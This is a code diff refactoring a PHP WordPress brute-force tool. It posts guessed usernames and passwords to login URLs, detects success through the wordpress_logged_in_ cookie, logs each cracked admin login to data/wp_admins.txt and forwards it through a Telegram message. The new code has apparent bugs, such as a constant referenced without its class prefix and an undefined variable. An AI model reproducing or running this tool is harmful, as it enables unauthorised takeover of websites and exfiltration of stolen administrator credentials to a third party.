@@ -11,6 +11,8 @@ use Monolog\Logger;
 
 class Brute
 {
+    protected const WP_COOKIE_LOGIN = 'wordpress_logged_in_';
+
     public function __construct()
     {
         $this->client = (new HttpClientBuilder())
@@ -22,45 +24,16 @@ class Brute
     public function __invoke($data)
     {
         $url = explode(';', $data['url'])[0];
-        $wp_cookie_login = 'wordpress_logged_in_';
 
-        $login = $this->loginCheck($data);
-        $password = $this->passwordCheck($data, $login);
-        $iteration = $this->checkIterator($data, $login, $password);
+        $login      = $this->loginCheck($data);
+        $password   = $this->passwordCheck($data, $login);
+        $iteration  = $this->checkIterator($data, $login, $password);
         $authorized = false;
 
         if ($iteration == true) {
-            $log = new Logger('name');
 
-            $body = new FormBody;
-            $body->addField('log', $login);
-            $body->addField('pwd', $password);
+            $this->handle($url, $login, $password);
 
-            $request = new Request($url, 'POST');
-            $request->setTcpConnectTimeout(2400);
-            $request->setBody($body);
-
-            $response = yield $this->client->request($request);
-            $cookies = $response->getHeaders()['set-cookie'];
-
-            foreach ($cookies as $cookie) {
-                if (str_contains($cookie, $wp_cookie_login))
-                    $authorized = true;
-            }
-
-//            var_dump([
-//                $login,
-//                $password,
-//                'куки' => $cookies,
-//                'авторизация' => $authorized
-//            ]);die;
-
-            if ($authorized == true) {
-                $wp_admin = "{$url};{$login};{$password}";
-                file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);
-
-                (new Telegram())->sendMessage($wp_admin);
-            }
         }
     }
 
@@ -84,8 +57,35 @@ class Brute
 
     public function passwordCheck($data, $login) {
         if ($data['password'] == '{login}' && $login != null)
-            return $this->login;
+            return $login;
         else
             return $data['password'];
+    }
+
+    public function handle($url, $login, $password) {
+        $log = new Logger('name');
+
+        $body = new FormBody;
+        $body->addField('log', $login);
+        $body->addField('pwd', $password);
+
+        $request = new Request($url, 'POST');
+        $request->setTcpConnectTimeout(2400);
+        $request->setBody($body);
+
+        $response = yield $this->client->request($request);
+        $cookies = $response->getHeaders()['set-cookie'];
+
+        foreach ($cookies as $cookie) {
+            if (str_contains($cookie, WP_COOKIE_LOGIN))
+                $authorized = true;
+        }
+
+        if ($authorized == true) {
+            $wp_admin = "{$url};{$login};{$password}";
+            file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);
+
+            (new Telegram())->sendMessage($wp_admin);
+        }
     }
 }
